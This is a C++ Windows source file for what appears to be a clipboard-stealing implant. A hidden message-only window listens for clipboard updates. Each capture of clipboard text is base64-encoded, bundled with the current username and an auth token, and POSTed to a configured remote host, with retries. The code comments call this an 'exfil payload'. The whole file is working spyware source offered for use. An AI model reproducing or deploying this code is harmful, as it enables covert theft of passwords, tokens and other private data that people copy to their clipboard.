#include <Windows.h>
#include <wincrypt.h>
#include <WinUser.h>

#include <stdio.h>

#include <monstars/http.h>
#include <monstars/logging.h>
#include <monstars/memory.h>
#include <monstars/mutex.h>
#include <monstars/object.h>
#include <monstars/util.h>

#include "bupkus.h"

HINSTANCE g_Instance = nullptr;
HWND g_Window = nullptr;
HANDLE g_SendMutex = nullptr;

static monstars::Cooldown s_Cooldown(c_PasteCooldown);

DWORD SendClipboardText(void*)
{
    // opening the clipboard can fail if someone else has it locked
    //   retry a few times until we get it, or give up
    bool clipboard = false;
    int attempts = c_ClipboardAttempts;
    int wait_amount = c_ClipboardInterval;
    do
    {
        if (OpenClipboard(g_Window))
        {
            clipboard = true;
            break;
        }
        if (--attempts)
        {
            Sleep(wait_amount);
            wait_amount *= c_ClipboardBackoff;
        }
    } while (attempts);

    if (!clipboard)
    {
        LOG_LINE_ERROR;
        return ERROR_CLIPBOARD_NOT_OPEN;
    }

    monstars::HeapBuffer textBuf;
    if (HANDLE data = GetClipboardData(CF_TEXT))
    {
        auto text = static_cast<char*>(GlobalLock(data));
        if (text)
        {
            size_t textLen = strlen(text);
            textBuf.Resize(textLen + 1);
            monstars::memcpy(textBuf.Get<void>(), textBuf.Size(), text, textLen);
            GlobalUnlock(text);  // always unlock
        }
    }
    CloseClipboard();  // always close the clipboard
    if (!textBuf)
    {
        LOG_LINE_ERROR;
        return ERROR_NO_DATA;
    }

    // convert the text to base64 (avoids json encoding problems)
    //   - first call gets the needed buffer size
    DWORD enc_size = 0;
    (void)CryptBinaryToStringA(textBuf.Get<byte>(), static_cast<DWORD>(textBuf.Size()),
                               CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &enc_size);
    monstars::HeapBuffer encBuf(static_cast<size_t>(enc_size) + 1);
    if (!enc_size || !CryptBinaryToStringA(textBuf.Get<byte>(), static_cast<DWORD>(textBuf.Size()),
                                           CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encBuf.Get(), &enc_size))
    {
        LOG_LINE_ERROR;
        return ERROR_ENCRYPTION_FAILED;
    }

    // construct the exfil payload - includes current username
    char username[MAX_PATH];
    DWORD nameSize = sizeof(username);
    (void)GetUserNameA(username, &nameSize);

    // first get the required size
    size_t jsonSize = snprintf(nullptr, 0, c_JsonTemplate, c_AuthToken, username, encBuf.Get());
    if (jsonSize < 1)
    {
        LOG_LINE_ERROR;
        return ERROR_BAD_LENGTH;
    }
    monstars::HeapBuffer jsonBuf(jsonSize + 1);
    snprintf(jsonBuf.Get(), jsonBuf.Size(), c_JsonTemplate, c_AuthToken, username, encBuf.Get());

    attempts = c_ConnectAttempts;
    do
    {
        // scoped lock
        {
            monstars::MutexLock lock(g_SendMutex, 300000);  // 5 minute timeout
            if (!lock)
            {
                LOG_LINE_ERROR;
                return ERROR_LOCK_FAILED;
            }
            monstars::HttpClient client(c_Hostname);
            if (client.PostRequest(c_Endpoint, jsonBuf.Get(), strnlen(jsonBuf.Get(), jsonBuf.Size()), c_ContentType))
            {
                return ERROR_SUCCESS;
            }
            if (client.Forbidden())
            {
                LOG_LINE_ERROR;
                return ERROR_ACCESS_DENIED;
            }
        }
        if (--attempts) Sleep(c_ConnectInterval);
    } while (attempts);

    return ERROR_TIMEOUT;
}


int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
{
    g_Instance = hInstance;
    g_SendMutex = CreateMutexW(nullptr, 0, nullptr);
    g_Window = CreateWindowExW(WS_EX_NOACTIVATE, L"STATIC", nullptr, WS_OVERLAPPEDWINDOW, 0, 0,
                               0, 0, HWND_MESSAGE, nullptr, g_Instance, nullptr);

    if (!AddClipboardFormatListener(g_Window))
    {
        LOG_LINE_ERROR;
        return ERROR_NOT_READY;
    }

    while (true)
    {
        static MSG msg = {};

        switch (GetMessageW(&msg, nullptr, 0, 0))
        {
        case -1:
        case 0:
            break;
        default:
            if (msg.message == WM_CLIPBOARDUPDATE)
            {
                if (IsClipboardFormatAvailable(CF_UNICODETEXT) && s_Cooldown)
                {
                    monstars::ObjectHandle thread = CreateThread(nullptr, 0, SendClipboardText, nullptr, 0, nullptr);
                }
            }
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }

    return ERROR_SUCCESS;
}